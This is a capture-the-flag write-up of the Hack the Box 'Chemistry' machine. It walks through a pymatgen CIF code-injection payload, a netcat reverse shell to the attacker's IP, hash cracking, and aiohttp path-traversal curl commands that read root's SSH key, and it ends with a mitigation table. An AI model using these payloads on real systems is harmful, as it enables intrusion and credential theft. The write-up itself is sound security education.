--- 
title: "Hack the Box (HTB) - Chemistry"
description: "Path Traversal & Arbitrary code execution"
date: 2025-10-26 12:00:00 -100
image: /assets/images/HTB - Chemistry/Thumbnail.jpg
categories: [CTF]
tags: [suid,php,boardlight,HTB]    # TAG names should always be lowercase
---

## Enumeration

We'll start by running an ***nmap*** scan against our target at `10.10.11.38`

```bash
nmap -sC -sV -A -p- 10.10.11.38 -oN nmap.txt
```

- -sC Run default scripts
- -sV Detects versions of services
- -A Enables aggressive scan
- -p- Scans all ports
- -oN saves output to nmap.txt

Looking at the results, we see the following ports and services

| **Port** | **Service** | **Version**                       |
|----------|-------------|------------------------------------|
| 22/tcp   | SSH         | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11) |
| 5000/tcp | Werkzeug    | Werkzeug/3.0.3 (Python 3.9.5)      |

Let's check out the application running on `http://10.10.11.38:5000`

![Port 5000](/assets/images/HTB%20-%20Chemistry/Web%20app%20on%205000.png)

Looks like an app will let us upload `CIF` files. A CIF file (Crystallographic Information File) is a text file format in crystallography to store detailed information about crystals.
Let's register for an account and see what we can do

![Logged in](/assets/images/HTB%20-%20Chemistry/Logged%20in.png)

The dashboard is telling us to upload a `CIF` file. Let's google for a CIF file exploit

![CVE](/assets/images/HTB%20-%20Chemistry/CVE%20Python%20Library.png)

We discover [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346) which is a vulnerability that was disclosed Feb 21st, 2024 with a severity of ***critical***

The CVE highlights an exploit in the `pymatgen` library allows for code execution. This is due to the use of the `eval()` function which executes strings as python code

We can see the exploit line as follows

```python
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
```

We can modify this to include a reverse shell. We're not sure what reverse shell will actually work, so let's go ahead and capture the upload request in Burp

![Intruder Image](/assets/images/HTB%20-%20Chemistry/Intruder%20Request%20Chemistry.png)

Now let's head over to payloads and add some basic reverse shell payloads

![Payload](/assets/images/HTB%20-%20Chemistry/Payload.png)

Viewing each of our uploaded malicious .cif file gives us a reverse shell. The payload that gave us the shell was `busybox nc -e /bin/bash 10.10.14.36 4444`

![Shell](/assets/images/HTB%20-%20Chemistry/Shell%20Chemistry.png)

Great, now let's upgrade our shell to a fully interactive one

![Upgraded Shell](/assets/images/HTB%20-%20Chemistry/Upgraded%20Shell.png)

Looking at `app.py` we see the following

![App.py](/assets/images/HTB%20-%20Chemistry/app.py.png)

The app.py is Flask web application that uses an SQLite database `SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'`

- `SECRET_KEY = 'MyS3cretCh3mistry4PP'`

Let's navigate to the directory where `database.db` is hosted and open it

![Database Tables](/assets/images/HTB%20-%20Chemistry/Database%20tables.png)

We see two tables, `structure` and `user`. Let's take a look inside the user table

![hashes](/assets/images/HTB%20-%20Chemistry/user%20hahes.png)

We see a list containing usernames & passwords hashes. Let's put the usernames ( minus 15th, 16th, and 17th as those are the ones we made earlier) into a file called `hashes.txt`. Make sure to strip the number and line

Now let's run hashcat against it

```bash
hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlist/rockyou.txt
```

![Pot File](/assets/images/HTB%20-%20Chemistry/Cracked%20Passwords.png)

Viewing the potfile shows us that we successfully cracked 4 passwords

- carlos: carlos123
- peter: peterparker
- victoria: victoria123
- rosa: unicorniosrosados

Checking the user on the machine, we do see that the user `rosa` exists. Let's try to SSH as rosa

```bash
ssh rosa@10.10.11.38
```

![User](/assets/images/HTB%20-%20Chemistry/rosa.png)

Nice, we have successfully gotten user on this machine

As always let's do some basic enumeration

| **Category**                      | **Command**                                      | **Result**                                       |
|-----------------------------------|--------------------------------------------------|--------------------------------------------------|
| **Current User & Group Perms (ID)** | `id`                                            | uid=1000(rosa) gid=1000(rosa) groups=1000(rosa) |
| **Kernel Version**                | `uname -r`                                      | 5.4.0-196-generic|
| **SUDO Permissions**              | `sudo -l`                                       | rosa may not run sudo on chemistry|
| **SUID Binaries**            | `find / -perm 4000 2>/dev/null`                  | Nothing                                      |
| **Services Running**      | `netstat -tuln`      | tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN                          |
| **PATH**                          | `echo $PATH`                                    | /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

There's a service running locally on `localhost:8080`. Let's forward this service to our attacker machine and check it out

```bash
ssh -L 8081:127.0.0.1:8080 rosa@10.10.11.38
```

Checking out the service, we see the following

![Local Service](/assets/images/HTB%20-%20Chemistry/local%20serice%208080.png)

Not much, let's check the server headers

![Server Header](/assets/images/HTB%20-%20Chemistry/Server%20Headers.png)

We see the server header as `Server: Python/3.9 aiohttp/3.9.1`

Let's search for exploits around the aiohttp 3.0.1 web framework

![CVE](/assets/images/HTB%20-%20Chemistry/CVE%202024-23334.png)

Looks like there might be a cve related to this web framework, let's take a look

![Github Page](/assets/images/HTB%20-%20Chemistry/CVE%20Python%20Library.png)

CVE-2024-233334 indicates that there's a `path traversal vulnerability in the python AioHTTP library =< 3.9.1`

To test our curl request for this exploit, we need to know what directory to start in. Let's view the source code of the app

![Source Code](/assets/images/HTB%20-%20Chemistry/Source%20Code.png)

There's a directory named `assets` that contains subdirectories like css and js for static files

Let's make our curl request now

```bash
# --path-as-is to ensure the request path is sent to the server exactly as written 

curl --path-as-is http://localhost:8080/assets/../../../root/root.txt
```

![Path Traversal Succesful](/assets/images/HTB%20-%20Chemistry/Path%20Traversal%20Successful.png)

Okay, the path traversal exploit does work, but let's actually get root access on the machine to obtain the flag

```bash
curl --path-as-is http://localhost:8080/assets/../../../root/.ssh/id_rsa
```

Save & set the correct permission on the private key

```bash
nano id_rsa
```

```bash
chmod 600 id_rsa
```

Now SSH as root!

```bash
ssh -i id_rsa root@10.10.11.38
```

![Root](/assets/images/HTB%20-%20Chemistry/Root%20Chemistry.png)

GG, we've rooted Chemistry!

| **Vulnerability**                                       | **Mitigation**                                                                                                                     |
|---------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------|
| **CVE-2024-23346: Arbitrary Code Execution in pymatgen** | **Update `pymatgen` to a version where this vulnerability is patched. Avoid using `eval()` on untrusted input. Implement strict input validation and sanitization when processing user-uploaded files like CIF files.** |
| **Weak Password Storage and Cracked Credentials**        | **Implement secure password hashing mechanisms using strong algorithms like bcrypt or Argon2 with salts. Enforce strong password policies and educate users on creating complex passwords. Ensure database files are not accessible to unauthorized users.** |
| **CVE-2024-23334: Path Traversal in aiohttp ≤ 3.9.1**   | **Upgrade `aiohttp` to the latest patched version where the vulnerability is fixed. Validate and sanitize all user-supplied paths. Use secure configurations to prevent path traversal attacks.** |
| **Sensitive Files Accessible via Path Traversal**       | **Restrict file permissions and access controls to sensitive files like `/root/.ssh/id_rsa`. Ensure that the web server runs with the least privileges necessary. Isolate sensitive files outside the web root or static file directories.** |
| **Exposed Static Directory (`/assets`)**                | **Configure the web server to prevent access to parent directories from the static file directory. Implement proper access controls and validate file paths to prevent unauthorized access.** |
| **SSH Private Key (`id_rsa`) Accessible**               | **Store SSH keys securely with strict permissions (e.g., `chmod 600`). Do not expose private keys on the server. Regularly audit file permissions and monitor access to sensitive files.** |

### Remediation References

- [CVE-2024-23346 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)
- [CVE-2024-23334 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-23334)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices/)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [OWASP Path Traversal Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html)
- [aiohttp Security Advisory](https://docs.aiohttp.org/en/stable/security.html)
- [Python Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Python_Security_Cheat_Sheet.html)
